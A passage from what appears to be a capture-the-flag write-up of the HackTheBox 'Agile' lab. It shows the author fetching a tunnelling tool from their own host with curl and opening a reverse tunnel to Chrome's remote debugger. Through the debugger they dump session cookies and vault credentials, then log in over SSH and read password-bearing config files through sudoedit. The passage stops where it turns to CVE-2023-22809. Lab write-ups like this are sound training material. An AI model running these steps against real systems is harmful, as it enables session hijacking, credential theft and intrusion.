</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>(</span><span class=n>venv</span><span class=p>)</span> <span class=n>corum</span><span class=nd>@agile</span><span class=p>:</span><span class=o>/</span><span class=n>app</span><span class=o>/</span><span class=n>app</span><span class=o>-</span><span class=n>testing</span><span class=err>$</span> <span class=n>cat</span> <span class=n>tests</span><span class=o>/</span><span class=n>functional</span><span class=o>/</span><span class=n>test_site_interactively</span><span class=o>.</span><span class=n>py</span> 
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pytest</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>selenium</span> <span class=kn>import</span> <span class=n>webdriver</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>selenium.webdriver.chrome.options</span> <span class=kn>import</span> <span class=n>Options</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>selenium.webdriver.common.by</span> <span class=kn>import</span> <span class=n>By</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>selenium.webdriver.support.ui</span> <span class=kn>import</span> <span class=n>WebDriverWait</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;/app/app-testing/tests/functional/creds.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>username</span><span class=p>,</span> <span class=n>password</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@pytest.fixture</span><span class=p>(</span><span class=n>scope</span><span class=o>=</span><span class=s2>&#34;session&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>driver</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>options</span> <span class=o>=</span> <span class=n>Options</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1>#options.add_argument(&#34;--no-sandbox&#34;)</span>
</span></span><span class=line><span class=cl>    <span class=n>options</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--window-size=1420,1080&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>options</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--headless&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>options</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--remote-debugging-port=41829&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>options</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;--disable-gpu&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>options</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;--crash-dumps-dir=/tmp&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>driver</span> <span class=o>=</span> <span class=n>webdriver</span><span class=o>.</span><span class=n>Chrome</span><span class=p>(</span><span class=n>options</span><span class=o>=</span><span class=n>options</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>yield</span> <span class=n>driver</span>
</span></span><span class=line><span class=cl>    <span class=n>driver</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test_login</span><span class=p>(</span><span class=n>driver</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;starting test_login&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>driver</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http://test.superpass.htb/account/login&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>username_input</span> <span class=o>=</span> <span class=n>driver</span><span class=o>.</span><span class=n>find_element</span><span class=p>(</span><span class=n>By</span><span class=o>.</span><span class=n>NAME</span><span class=p>,</span> <span class=s2>&#34;username&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>username_input</span><span class=o>.</span><span class=n>send_keys</span><span class=p>(</span><span class=n>username</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>password_input</span> <span class=o>=</span> <span class=n>driver</span><span class=o>.</span><span class=n>find_element</span><span class=p>(</span><span class=n>By</span><span class=o>.</span><span class=n>NAME</span><span class=p>,</span> <span class=s2>&#34;password&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>password_input</span><span class=o>.</span><span class=n>send_keys</span><span class=p>(</span><span class=n>password</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>driver</span><span class=o>.</span><span class=n>find_element</span><span class=p>(</span><span class=n>By</span><span class=o>.</span><span class=n>NAME</span><span class=p>,</span> <span class=s2>&#34;submit&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>click</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>title</span> <span class=o>=</span> <span class=n>driver</span><span class=o>.</span><span class=n>find_element</span><span class=p>(</span><span class=n>By</span><span class=o>.</span><span class=n>TAG_NAME</span><span class=p>,</span> <span class=s2>&#34;h1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>title</span><span class=o>.</span><span class=n>text</span> <span class=o>==</span> <span class=s2>&#34;Welcome to your vault&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test_add_password</span><span class=p>(</span><span class=n>driver</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;starting test_add_password&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>driver</span><span class=o>.</span><span class=n>find_element</span><span class=p>(</span><span class=n>By</span><span class=o>.</span><span class=n>NAME</span><span class=p>,</span> <span class=s2>&#34;add_password&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>click</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>site</span> <span class=o>=</span> <span class=n>driver</span><span class=o>.</span><span class=n>find_element</span><span class=p>(</span><span class=n>By</span><span class=o>.</span><span class=n>NAME</span><span class=p>,</span> <span class=s2>&#34;url&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>site</span><span class=o>.</span><span class=n>send_keys</span><span class=p>(</span><span class=s2>&#34;test_site&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=n>driver</span><span class=o>.</span><span class=n>find_element</span><span class=p>(</span><span class=n>By</span><span class=o>.</span><span class=n>NAME</span><span class=p>,</span> <span class=s2>&#34;username&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>username</span><span class=o>.</span><span class=n>send_keys</span><span class=p>(</span><span class=s2>&#34;test_user&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>driver</span><span class=o>.</span><span class=n>find_element</span><span class=p>(</span><span class=n>By</span><span class=o>.</span><span class=n>CLASS_NAME</span><span class=p>,</span> <span class=s2>&#34;fa-save&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>click</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=s1>&#39;test_site&#39;</span> <span class=ow>in</span> <span class=n>driver</span><span class=o>.</span><span class=n>page_source</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=s1>&#39;test_user&#39;</span> <span class=ow>in</span> <span class=n>driver</span><span class=o>.</span><span class=n>page_source</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test_del_password</span><span class=p>(</span><span class=n>driver</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;starting test_del_password&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>password_rows</span> <span class=o>=</span> <span class=n>driver</span><span class=o>.</span><span class=n>find_elements</span><span class=p>(</span><span class=n>By</span><span class=o>.</span><span class=n>CLASS_NAME</span><span class=p>,</span> <span class=s2>&#34;password-row&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>row</span> <span class=ow>in</span> <span class=n>password_rows</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;test_site&#34;</span> <span class=o>==</span> <span class=n>row</span><span class=o>.</span><span class=n>find_elements</span><span class=p>(</span><span class=n>By</span><span class=o>.</span><span class=n>TAG_NAME</span><span class=p>,</span> <span class=s2>&#34;td&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>text</span> <span class=ow>and</span> \
</span></span><span class=line><span class=cl>            <span class=s2>&#34;test_user&#34;</span> <span class=o>==</span> <span class=n>row</span><span class=o>.</span><span class=n>find_elements</span><span class=p>(</span><span class=n>By</span><span class=o>.</span><span class=n>TAG_NAME</span><span class=p>,</span> <span class=s2>&#34;td&#34;</span><span class=p>)[</span><span class=mi>2</span><span class=p>]</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>row</span><span class=o>.</span><span class=n>find_element</span><span class=p>(</span><span class=n>By</span><span class=o>.</span><span class=n>CLASS_NAME</span><span class=p>,</span> <span class=s2>&#34;fa-trash&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>click</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=s1>&#39;test_site&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>driver</span><span class=o>.</span><span class=n>page_source</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=s1>&#39;test_user&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>driver</span><span class=o>.</span><span class=n>page_source</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test_title</span><span class=p>(</span><span class=n>driver</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;starting test_title&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>driver</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http://test.superpass.htb&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=s2>&#34;SuperPassword 𥦸&#34;</span> <span class=o>==</span> <span class=n>driver</span><span class=o>.</span><span class=n>title</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test_long_running</span><span class=p>(</span><span class=n>driver</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;starting test_long_running&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>driver</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http://test.superpass.htb&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>550</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#time.sleep(5)</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=s2>&#34;SuperPasword 𥦸&#34;</span> <span class=o>==</span> <span class=n>driver</span><span class=o>.</span><span class=n>title</span>
</span></span></code></pre></td></tr></table></div></div><p>Our Python script above looks to be running some tests with Selenium using headless Chrome. It reads credentials from <code>/app/app-testing/tests/functional/creds.txt</code> into username and password.</p><p>The test suite authenticates by using the Selenium web driver to browse to <a href=http://test.superpass.htb/account/login target=_blank rel="noopener noreffer">http://test.superpass.htb/account/login</a>, finds the username and password elements on the page, enters key presses using the credentials from <code>/app/app-testing/tests/functional/creds.txt</code>, clicks the submit button, then confirms <em>&ldquo;Welcome to your vault&rdquo;</em> shows in a h1 heading.</p><p>Similarly, other tests exist to confirm a password can be added to the password vault app and removed by interacting with the app, and asserting on whether or not elements exist on the page.</p><p>Circling back around to our <code>test_and_update.sh</code>, basically if the tests pass, it will then deploy the superpass directory from <code>/app/app-testing</code> into the production folder <code>/app/app</code> by doing a recursive copy with <code>cp -r</code></p><p>I looked at <code>/app/venv/bin/activate</code>, which adds <code>/app/venv/bin</code> to the beginning of <code>$PATH</code> to see if I could write to and change the virtual env to overwrite executables such as <code>pytest</code> to run a shell, but no luck.</p><p>The above test script opens Chromes remote debugger on port 41829, which we can also see in the output. Seeing as though our test suite above logs in with valid credentials in the test environment, I started looking around to see if we could dump/steal cookies via the remote debugger.</p><p>This article <a href=https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/ target=_blank rel="noopener noreffer">https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/</a> outlines connecting to the remote debugger. I uploaded <a href=https://github.com/jpillora/chisel target=_blank rel="noopener noreffer">chisel</a> to our target, which allows us to tunnel TCP connections over HTTP.</p><p>First, I ran a chisel server (reverse) locally on my Parrot VM on port 8000:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>zara$./chisel server -p <span class=m>8000</span> --reverse
</span></span><span class=line><span class=cl>2023/03/23 21:44:15 server: Reverse tunnelling enabled
</span></span><span class=line><span class=cl>2023/03/23 21:44:15 server: Fingerprint RKgTWkEcy/7fipXRcrsd8C1ZXHPjm4hp6Jmgi4P827E<span class=o>=</span>
</span></span><span class=line><span class=cl>2023/03/23 21:44:15 server: Listening on http://0.0.0.0:8000 
</span></span></code></pre></td></tr></table></div></div><p>Next, I downloaded chisel to the target from my own machine&rsquo;s HTTP server. We run with <code>10.10.14.8:8000</code> , to connect <strong>out</strong> to my machine. <code>R:4444:127.00.1:41829</code> is allowing our client (the target) to define a reverse tunnel (we specified <code>--reverse</code> flag on the server above) such that if I connect to port 4444 on my own machine, a reverse tunnel back to the client/target will be opened and forwarded to the chrome remote debugger on 41829:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>corum@agile:/dev/shm$ curl -o chisel http://10.10.14.8:8081/chisel
</span></span><span class=line><span class=cl>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class=line><span class=cl>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class=line><span class=cl><span class=m>100</span> 8188k  <span class=m>100</span> 8188k    <span class=m>0</span>     <span class=m>0</span>  2007k      <span class=m>0</span>  0:00:04  0:00:04 --:--:-- 2007k
</span></span><span class=line><span class=cl>corum@agile:/dev/shm$ chmod +x chisel
</span></span><span class=line><span class=cl>corum@agile:/dev/shm$ ./chisel client 10.10.14.8:8000 R:4444:127.0.0.1:41829
</span></span></code></pre></td></tr></table></div></div><p>Initially I tried browsing to http://localhost:4444/ in Chromium, but was getting a blank page and not sure on the correct URL. I next encountered a great article demonstrating cookie dumping via the remote debugger: <a href=https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e target=_blank rel="noopener noreffer">Hands in the Cookie Jar: Dumping Cookies with Chromium&rsquo;s Remote Debugger Port</a></p><p>Preferring to do things the manual way, we enumerate the <code>/json</code> endpoint, which gives us the web socket address for the remote debugger:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> http://127.0.0.1:4444/json                                          
</span></span><span class=line><span class=cl><span class=o>[</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>   <span class=s2>&#34;description&#34;</span>: <span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;devtoolsFrontendUrl&#34;</span>: <span class=s2>&#34;/devtools/inspector.html?ws=127.0.0.1:4444/devtools/page/F5C885E8C47B8DABE5F40413343D1DA7&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;id&#34;</span>: <span class=s2>&#34;F5C885E8C47B8DABE5F40413343D1DA7&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;title&#34;</span>: <span class=s2>&#34;SuperPassword 𥦸&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;type&#34;</span>: <span class=s2>&#34;page&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;url&#34;</span>: <span class=s2>&#34;http://test.superpass.htb/&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;webSocketDebuggerUrl&#34;</span>: <span class=s2>&#34;ws://127.0.0.1:4444/devtools/page/F5C885E8C47B8DABE5F40413343D1DA7&#34;</span>
</span></span><span class=line><span class=cl><span class=o>}</span> <span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>Next, connect to the web socket, and issue the <code>Network.getAllCookies</code> API command, which, you guessed it, dumps the headless brower&rsquo;s cookies:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$wsdump</span> ws://127.0.0.1:4444/devtools/page/F5C885E8C47B8DABE5F40413343D1DA7
</span></span><span class=line><span class=cl>Press Ctrl+C to quit
</span></span><span class=line><span class=cl>&gt; <span class=o>{</span><span class=s2>&#34;id&#34;</span>: 1, <span class=s2>&#34;method&#34;</span>: <span class=s2>&#34;Network.getAllCookies&#34;</span><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt; <span class=o>{</span><span class=s2>&#34;id&#34;</span>:1,<span class=s2>&#34;result&#34;</span>:<span class=o>{</span><span class=s2>&#34;cookies&#34;</span>:<span class=o>[{</span><span class=s2>&#34;name&#34;</span>:<span class=s2>&#34;remember_token&#34;</span>,<span class=s2>&#34;value&#34;</span>:<span class=s2>&#34;1|7fdd6de822618430df3a639745265d1843029b204f9785856ac1b107d54cb0948f2d43b52093bdf700bf9e6932003f2a6603445fddd88a352824cc21c7b874d4&#34;</span>,<span class=s2>&#34;domain&#34;</span>:<span class=s2>&#34;test.superpass.htb&#34;</span>,<span class=s2>&#34;path&#34;</span>:<span class=s2>&#34;/&#34;</span>,<span class=s2>&#34;expires&#34;</span>:1711140905.844064,<span class=s2>&#34;size&#34;</span>:144,<span class=s2>&#34;httpOnly&#34;</span>:true,<span class=s2>&#34;secure&#34;</span>:false,<span class=s2>&#34;session&#34;</span>:false,<span class=s2>&#34;priority&#34;</span>:<span class=s2>&#34;Medium&#34;</span>,<span class=s2>&#34;sameParty&#34;</span>:false,<span class=s2>&#34;sourceScheme&#34;</span>:<span class=s2>&#34;NonSecure&#34;</span>,<span class=s2>&#34;sourcePort&#34;</span>:80<span class=o>}</span>,<span class=o>{</span><span class=s2>&#34;name&#34;</span>:<span class=s2>&#34;session&#34;</span>,<span class=s2>&#34;value&#34;</span>:<span class=s2>&#34;.eJwlzjkOwjAQAMC_uKbYy2snn0HeS9AmpEL8HSTmBfNu9zryfLT9dVx5a_dntL1x6FxEI2cX1lATrF6KSgYjJDcv24LSRQu2bqQwPXGymkPMEIMAjpDRO6DjcqqZqoOjWBxRQYEsmXHgxCUhsNzTRhh2kvaLXGce_w22zxef3y7n.ZBy8qQ.FDBjE0KMsHAElWcFQXZ_bku66-I&#34;</span>,<span class=s2>&#34;domain&#34;</span>:<span class=s2>&#34;test.superpass.htb&#34;</span>,<span class=s2>&#34;path&#34;</span>:<span class=s2>&#34;/&#34;</span>,<span class=s2>&#34;expires&#34;</span>:-1,<span class=s2>&#34;size&#34;</span>:215,<span class=s2>&#34;httpOnly&#34;</span>:true,<span class=s2>&#34;secure&#34;</span>:false,<span class=s2>&#34;session&#34;</span>:true,<span class=s2>&#34;priority&#34;</span>:<span class=s2>&#34;Medium&#34;</span>,<span class=s2>&#34;sameParty&#34;</span>:false,<span class=s2>&#34;sourceScheme&#34;</span>:<span class=s2>&#34;NonSecure&#34;</span>,<span class=s2>&#34;sourcePort&#34;</span>:80<span class=o>}]}}</span>
</span></span></code></pre></td></tr></table></div></div><p>We can also just browse to the <code>devtoolsFrontendUrl</code> above, and we&rsquo;re effectively looking at the selenium test session, with access to the password vault for the test user:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/2023-08-06-agile-htb/assets/2023-03-24-08-14-21-image.png data-srcset="/2023-08-06-agile-htb/assets/2023-03-24-08-14-21-image.png, /2023-08-06-agile-htb/assets/2023-03-24-08-14-21-image.png 1.5x, /2023-08-06-agile-htb/assets/2023-03-24-08-14-21-image.png 2x" data-sizes=auto alt=/2023-08-06-agile-htb/assets/2023-03-24-08-14-21-image.png title=/2023-08-06-agile-htb/assets/2023-03-24-08-14-21-image.png width=1685 height=674></p><p>So, we have two sets of credentials - <code>edwards</code> / <code>d07867c6267dcb5df0af</code> and <code>dedwards__</code> / <code>7dbfe676b6b564ce5718</code></p><p>Trying the first set of credentials grants us SSH access:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$sshpass</span> -p <span class=s1>&#39;d07867c6267dcb5df0af&#39;</span> ssh edwards@superpass.htb
</span></span><span class=line><span class=cl>Welcome to Ubuntu 22.04.2 LTS <span class=o>(</span>GNU/Linux 5.15.0-60-generic x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>This system has been minimized by removing packages and content that are
</span></span><span class=line><span class=cl>not required on a system that users <span class=k>do</span> not log into.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>To restore this content, you can run the <span class=s1>&#39;unminimize&#39;</span> command.
</span></span><span class=line><span class=cl>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The programs included with the Debian GNU/Linux system are free software<span class=p>;</span>
</span></span><span class=line><span class=cl>the exact distribution terms <span class=k>for</span> each program are described in the
</span></span><span class=line><span class=cl>individual files in /usr/share/doc/*/copyright.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span class=line><span class=cl>permitted by applicable law.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Last login: Thu Mar  <span class=m>2</span> 10:28:51 <span class=m>2023</span> from 10.10.14.23
</span></span><span class=line><span class=cl>edwards@agile:~$ 
</span></span></code></pre></td></tr></table></div></div><p>Checking sudo access, we see we can run <code>sudoedit</code> on two files as the dev_admin user:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>edwards@agile:~$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> edwards on agile:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin, use_pty
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User edwards may run the following commands on agile:
</span></span><span class=line><span class=cl>    <span class=o>(</span>dev_admin : dev_admin<span class=o>)</span> sudoedit /app/config_test.json
</span></span><span class=line><span class=cl>    <span class=o>(</span>dev_admin : dev_admin<span class=o>)</span> sudoedit /app/app-testing/tests/functional/creds.txt
</span></span></code></pre></td></tr></table></div></div><p>We find a database connection string with credentials when running <code>sudoedit -u dev_admin /app/config_test.json</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;SQL_URI&#34;</span><span class=p>:</span> <span class=s2>&#34;mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Running <code>sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>edwards:1d7ffjwrx#$d6qn!9nndqgde4
</span></span></code></pre></td></tr></table></div></div><p>It was here I started to go down rabbit holes, looking as SetUID binaries (wondering if I could exploit <code>chrome-sandbox</code>..), running LinPEAS again, looking for world-writeable files, grepping the filesystem for passwords stored in clear text, etc.</p><p>I then search for <em>&ldquo;sudoedit arbitrary file&rdquo;</em>, wondering if I could change my <code>sudo</code>ers permission to edit <strong>any</strong> arbitrary file, not just <code>/app/config_test.json</code> and <code>/app/app-testing/tests/functional/creds.txt</code>. I came across <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22809" target=_blank rel="noopener noreffer">CVE-2023-22809</a> here <a href=https://www.sudo.ws/security/advisories/sudoedit_any/ target=_blank rel="noopener noreffer">Sudoedit can edit arbitrary files | Sudo</a>, which affects up to sudo version 1.9.12p1 &ndash; a fairly new CVE!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
